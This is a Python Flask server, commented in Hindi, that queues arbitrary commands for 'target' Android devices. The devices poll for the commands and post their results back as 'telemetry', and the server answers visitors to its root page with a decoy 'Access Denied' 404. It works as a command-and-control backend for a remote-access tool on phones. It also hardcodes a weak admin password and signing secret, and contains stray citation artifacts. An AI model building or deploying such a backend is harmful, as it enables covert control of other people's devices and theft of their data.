import jwt
import datetime
from functools import wraps
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # Cross-Origin Requests को अलाउ करने के लिए

# Secret Key और Admin Credentials
app.config['SECRET_KEY'] = 'SUPER_SECRET_STRONG_KEY_12345'
ADMIN_USERNAME = "admin"
ADMIN_PASSWORD = "password123"

# इन-मेमोरी कमांड Queue (डैशबोर्ड से कमांड यहाँ स्टोर होगी और ऐप इसे फेच करेगा)
# Format: { device_id: "command_string" }
pending_commands = {}
device_telemetry_results = {}

# --- Authentication Decorator ---
def token_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('Authorization')
        if not token:
            return jsonify({"status": "error", "message": "Token is missing!"}), 401
        
        try:
            if token.startswith("Bearer "):
                token = token.split(" ")[1]
            data = jwt.decode(token, app.config['SECRET_KEY'], algorithms=["HS256"])
        except Exception as e:
            return jsonify({"status": "error", "message": "Invalid or expired token!"}), 401
            
        return f(*args, **kwargs)
    return decorated

# --- 1. Root Route ---
@app.route('/', methods=['GET'])
def home():
    return jsonify({
        "status": "error",
        "message": "System Secure Gateway Active. Access Denied."
    }), 404

# --- 2. Login Endpoint (Dashboard के लिए)[span_8](start_span)[span_8](end_span) ---
@app.route('/api/login', methods=['POST'])
def login():
    data = request.get_json()
    if not data or 'username' not in data or 'password' not in data:
        return jsonify({"status": "error", "message": "Username and Password required"}), 400
    
    if data['username'] == ADMIN_USERNAME and data['password'] == ADMIN_PASSWORD:
        token = jwt.encode({
            'user': data['username'],
            'exp': datetime.datetime.utcnow() + datetime.timedelta(hours=24)
        }, app.config['SECRET_KEY'], algorithm="HS256")
        
        return jsonify({
            "status": "success",
            "message": "Login successful",
            "token": token
        }), 200
    
    return jsonify({"status": "error", "message": "Invalid Credentials"}), 401

# --- 3. Command Execution Endpoint (डैशबोर्ड से कमांड भेजने के लिए)[span_9](start_span)[span_9](end_span) ---
@app.route('/api/execute', methods=['POST'])
@token_required
def execute_command():
    data = request.get_json()
    if not data or 'command' not in data:
        return jsonify({"status": "error", "message": "No command provided"}), 400
    
    command = data.get('command')
    target_device_id = data.get('device_id', 'DEFAULT_DEVICE')
    
    # कमांड को पेंडिंग queue में डालना ताकि एंड्रॉइड ऐप इसे उठा सके
    pending_commands[target_device_id] = command

    return jsonify({
        "status": "success",
        "command_executed": command,
        "target_device": target_device_id,
        "message": "Command queued successfully for target device.",
        "timestamp": str(datetime.datetime.now())
    }), 200

# --- 4. Android App Polling Endpoint (ApiClient.txt के मुताबिक)[span_10](start_span)[span_10](end_span) ---
@app.route('/get-command', methods=['GET'])
def get_command():
    device_id = request.args.get('device_id', 'DEFAULT_DEVICE')
    
    # चेक करें कि इस डिवाइस के लिए कोई कमांड पेंडिंग है या नहीं
    cmd = pending_commands.get(device_id, "none")
    
    # एक बार कमांड भेजने के बाद उसे क्लियर कर देना ताकि बार-बार रिपीट न हो
    if cmd != "none":
        pending_commands[device_id] = "none"

    return jsonify({
        "cmd": cmd,
        "status": "success"
    }), 200

# --- 5. Android App Result Post Endpoint (ApiClient.txt के मुताबिक)[span_11](start_span)[span_11](end_span) ---
@app.route('/post-result', methods=['POST'])
def post_result():
    data = request.get_json()
    if not data:
        return jsonify({"status": "error", "message": "No data received"}), 400
        
    device_id = data.get('device_id', 'UNKNOWN')
    cmd = data.get('cmd', '')
    result_data = data.get('result', '')
    
    # रिजल्ट को स्टोर करना ताकि डैशबोर्ड इसे देख सके
    device_telemetry_results[device_id] = {
        "command": cmd,
        "result": result_data,
        "timestamp": str(datetime.datetime.now())
    }
    
    print(f"Received Result from [Device: {device_id}] for [Cmd: {cmd}] -> {result_data}")

    return jsonify({
        "status": "success",
        "message": "Telemetry result saved successfully"
    }), 200

# --- 6. Fetch Latest Result Endpoint (डैशबोर्ड पर रिजल्ट दिखाने के लिए) ---
@app.route('/api/get-latest-result', methods=['GET'])
@token_required
def get_latest_result():
    device_id = request.args.get('device_id', 'DEFAULT_DEVICE')
    result = device_telemetry_results.get(device_id, {"info": "No recent telemetry data found."})
    return jsonify({
        "status": "success",
        "data": result
    }), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
